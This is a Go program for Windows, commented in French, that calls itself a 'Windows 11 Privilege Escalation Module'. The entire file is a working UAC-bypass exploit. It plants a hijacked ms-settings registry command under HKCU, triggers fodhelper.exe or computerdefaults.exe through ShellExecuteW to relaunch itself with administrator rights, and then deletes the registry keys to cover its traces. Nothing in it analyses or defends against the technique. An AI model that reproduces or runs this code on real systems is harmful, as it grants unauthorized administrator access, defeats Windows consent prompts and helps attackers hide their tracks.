//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

// --- CONSTANTES ET DLL WINDOWS ---

var (
	shell32           = syscall.NewLazyDLL("shell32.dll")
	procShellExecuteW = shell32.NewProc("ShellExecuteW")
)

// ShellExecuteW : Utilisation de l'API Windows pour contourner les restrictions de lancement de binaires auto-élevés
func ShellExecute(verb, file, args, dir string, show int) error {
	v, _ := syscall.UTF16PtrFromString(verb)
	f, _ := syscall.UTF16PtrFromString(file)
	a, _ := syscall.UTF16PtrFromString(args)
	d, _ := syscall.UTF16PtrFromString(dir)

	ret, _, _ := procShellExecuteW.Call(
		0,
		uintptr(unsafe.Pointer(v)),
		uintptr(unsafe.Pointer(f)),
		uintptr(unsafe.Pointer(a)),
		uintptr(unsafe.Pointer(d)),
		uintptr(show),
	)

	// ShellExecute renvoie une valeur > 32 en cas de succès
	if ret <= 32 {
		return fmt.Errorf("ShellExecute failed with error code: %d", ret)
	}
	return nil
}

// CheckAdmin : Vérifie si le processus actuel possède les privilèges Administrateur
func CheckAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// ExploitUAC : Réalise un bypass de l'UAC via l'outil légitime fodhelper.exe ou computerdefaults.exe
func ExploitUAC() bool {
	fmt.Println("[*] Phase 1 : Hijacking du registre (ms-settings)...")

	regKey := `Software\Classes\ms-settings\Shell\Open\command`
	selfPath, _ := os.Executable()

	// Le payload va relancer ce même binaire avec les droits hérités du processus parent auto-élevé
	payload := fmt.Sprintf("cmd.exe /c start \"\" \"%s\"", selfPath)

	// Nettoyage préalable pour éviter les conflits
	exec.Command("reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f").Run()

	// Création des clés malicieuses
	err1 := exec.Command("reg", "add", "HKCU\\"+regKey, "/ve", "/t", "REG_SZ", "/d", payload, "/f").Run()
	err2 := exec.Command("reg", "add", "HKCU\\"+regKey, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f").Run()

	if err1 != nil || err2 != nil {
		fmt.Println("[-] Erreur lors de la modification du registre.")
		return false
	}

	fmt.Println("[*] Phase 2 : Déclenchement via ShellExecute (Bypass CreateProcess restrictions)...")

	// Tentative avec fodhelper.exe
	err := ShellExecute("open", "fodhelper.exe", "", "", 0)

	// Plan B : Si fodhelper est bloqué ou ne se lance pas, on tente computerdefaults
	if err != nil {
		fmt.Println("[*] fodhelper a échoué, tentative via computerdefaults.exe...")
		err = ShellExecute("open", "computerdefaults.exe", "", "", 0)
	}

	if err != nil {
		fmt.Printf("[-] Échec du déclenchement : %v\n", err)
		return false
	}

	fmt.Println("[*] Phase 3 : Nettoyage des traces...")
	time.Sleep(3 * time.Second) // Temporisation pour laisser l'OS lire le registre
	exec.Command("reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f").Run()

	return true
}

func main() {
	fmt.Println("====================================================")
	fmt.Println("   Windows 11 Privilege Escalation Module v6.2")
	fmt.Println("   Target: Windows 11 (23H2 Support)")
	fmt.Println("   Technique: ShellExecute UAC Bypass")
	fmt.Println("====================================================")

	if CheckAdmin() {
		fmt.Println("\n[+] ############################################")
		fmt.Println("[+] #   SUCCÈS : PRIVILÈGES ÉLEVÉS ACQUIS !    #")
		fmt.Println("[+] ############################################")
		fmt.Println("\n[*] Utilisateur identifié :")
		out, _ := exec.Command("whoami").Output()
		fmt.Print(string(out))

		fmt.Println("\nAppuyez sur Entrée pour fermer cette session élevée...")
		var input string
		fmt.Scanln(&input)
		return
	}

	fmt.Println("[!] État actuel : UTILISATEUR LIMITÉ")
	fmt.Println("[*] Lancement de l'escalade de privilèges...")

	if ExploitUAC() {
		fmt.Println("\n[+] L'exploit a été envoyé au système.")
		fmt.Println("[*] Une nouvelle fenêtre devrait s'ouvrir en mode ADMINISTRATEUR.")
	} else {
		fmt.Println("[-] ÉCHEC : L'escalade a été bloquée par le système.")
	}

	fmt.Println("\nAppuyez sur Entrée pour quitter...")
	var input string
	fmt.Scanln(&input)
}
